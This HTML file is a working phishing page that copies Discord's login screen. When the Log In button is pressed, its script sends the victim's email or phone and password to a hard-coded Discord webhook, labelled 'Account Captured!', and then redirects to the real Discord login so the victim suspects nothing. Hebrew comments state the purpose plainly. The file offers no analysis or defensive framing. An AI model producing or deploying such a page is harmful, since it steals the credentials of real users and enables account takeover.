<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Login</title>
    <style>
        body { background-image: url('https://discord.com/assets/7c97f791834a3614138e.svg'); background-size: cover; background-color: #313338; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
        .login-card { background: #313338; padding: 32px; border-radius: 8px; width: 480px; box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2); text-align: center; }
        .logo { width: 124px; margin-bottom: 20px; }
        h2 { color: white; margin-bottom: 8px; font-size: 24px; font-weight: 600; }
        p { color: #b5bac1; margin-bottom: 20px; font-size: 16px; }
        .input-group { text-align: left; margin-bottom: 20px; }
        label { color: #b5bac1; font-size: 12px; font-weight: bold; display: block; margin-bottom: 8px; text-transform: uppercase; }
        input { width: 100%; padding: 10px; border-radius: 3px; border: none; background: #1e1f22; color: white; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: 1px solid #5865f2; }
        .forgot { color: #00a8fc; font-size: 14px; text-decoration: none; display: block; margin-top: 4px; }
        button { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 3px; cursor: pointer; font-size: 16px; font-weight: 500; margin-top: 20px; transition: background 0.2s; }
        button:hover { background: #4752c4; }
        .register { color: #b5bac1; font-size: 14px; margin-top: 8px; }
        .register a { color: #00a8fc; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="https://upload.wikimedia.org/wikipedia/he/thumb/d/d3/Discord_logo_svg.svg/1200px-Discord_logo_svg.svg.png" class="logo" alt="Discord">
        <h2>Welcome back!</h2>
        <p>We're so excited to see you again!</p>
        
        <div class="input-group">
            <label>Email or Phone Number</label>
            <input type="text" id="user_identity" required>
        </div>
        
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="user_password" required>
            <a href="#" class="forgot">Forgot your password?</a>
        </div>
        
        <button onclick="intercept()">Log In</button>
        
        <div class="register">
            Need an account? <a href="#">Register</a>
        </div>
    </div>

    <script>
        async function intercept() {
            const id = document.getElementById('user_identity').value;
            const pass = document.getElementById('user_password').value;
            const webhook = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";

            if (id && pass) {
                // שליחת הפרטים ל-Webhook שלך
                await fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "🔱 **Account Captured!**",
                            color: 15158332,
                            fields: [
                                { name: "📧 Email/Phone", value: "`" + id + "`", inline: false },
                                { name: "🔑 Password", value: "`" + pass + "`", inline: false }
                            ],
                            footer: { text: "Phishing Method: Discord Login Clone" },
                            timestamp: new Date().toISOString()
                        }]
                    })
                });

                // העברה לדיסקורד האמיתי כדי שהמשתמש יחשוב שזו הייתה טעות ויתחבר שוב
                window.location.href = "https://discord.com/login";
            } else {
                alert("Please fill in all fields.");
            }
        }
    </script>
</body>
</html>
